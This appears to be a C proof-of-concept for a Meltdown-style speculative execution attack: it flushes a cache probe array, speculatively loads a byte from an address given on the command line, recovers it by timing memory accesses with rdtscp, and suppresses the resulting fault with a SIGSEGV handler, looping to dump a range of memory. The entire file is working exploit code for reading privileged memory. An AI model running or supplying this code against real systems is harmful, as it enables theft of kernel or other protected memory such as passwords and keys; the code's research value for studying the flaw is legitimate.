#define _GNU_SOURCE
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#define PAGE_SIZE 4 * 1024
#define ARRAY_SIZE 256

static char target_array[ARRAY_SIZE * PAGE_SIZE];
int check_array[ARRAY_SIZE];

void clflush(void)
{
	int i;
	for (i = 0; i < ARRAY_SIZE; i++)
		_mm_clflush(&target_array[i * PAGE_SIZE]);
}

extern char stopspeculate[];

void speculate(unsigned long addr)
{
	pid_t pid=0;
	pid=fork();
	if(pid==0)
	{
//		printf("child!\n");
	__asm__ __volatile__(
		".rept 100\n\t"
		"add $0xfff, %%rax\n\t"
		".endr\n\t"

		"movzx (%0), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"movzx (%1, %%rax, 1), %%rbx\n\t"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
	: "r" (addr),"r" (target_array)
		: "ax", "bx"
		);
	}
	else
	{
//		printf("father!\n");
		__asm__ __volatile__(
		".rept 500\n\t"
		"nop\n\t"
		".endr\n\t"
		:
	: 
		: "cx"
		);
	}
}
void check(void)
{
	int i, min_i;
	unsigned long long time1, time2;
	unsigned long long min_time = 100000;
	static unsigned int zero = 0;
	unsigned long addr;
	for (i = 0; i < ARRAY_SIZE; i++)
	{
		addr = (unsigned long)(target_array+i * PAGE_SIZE);
		time1 = __rdtscp(&zero);
		__asm__ __volatile__(
			"movl (%0), %%eax\n\t"
			:
		: "r"(addr)
			: "ax"
			);
		time2 = __rdtscp(&zero);
		if (time2 - time1 < min_time)
		{
			min_time = time2 - time1;
//			printf("min time:%d--%d\n",min_time,i);
			min_i = i;
		}
	}
//	printf("min_i=%d\n",min_i);
	check_array[min_i]+=1;
//	printf("checy_array=%d\n",check_array[min_i]);
}

int readbyte(unsigned long addr)
{
	static char cache_time[256];
	int max_i, max=0;
	memset(check_array, 0, sizeof(check_array));
	int i;
	for (i = 0; i < 1000; i++)
	{
		clflush();
		speculate(addr);
		check();
	}
	for (i = 0; i < ARRAY_SIZE; i++)
	{
		printf("check_array[%d]=%d\n",i,check_array[i]);
		if (check_array[i] > max)
		{
			max = check_array[i];
			max_i = i;
		}
	}
	return max_i;
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
	return;
}

int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

int main(int argc, char *argv[])
{
	int i, ret;
	unsigned long addr;
	int size=10;
	sscanf(argv[1], "%lx", &addr);
	sscanf(argv[2], "%dx", &size);
	memset(target_array, 1, sizeof(target_array));
	for (i = 0; i < size; i++)
	{
		ret = readbyte(addr);
		printf("read:%lx ret=%d\n", addr, ret);
		addr++;
	}
	return 0;
}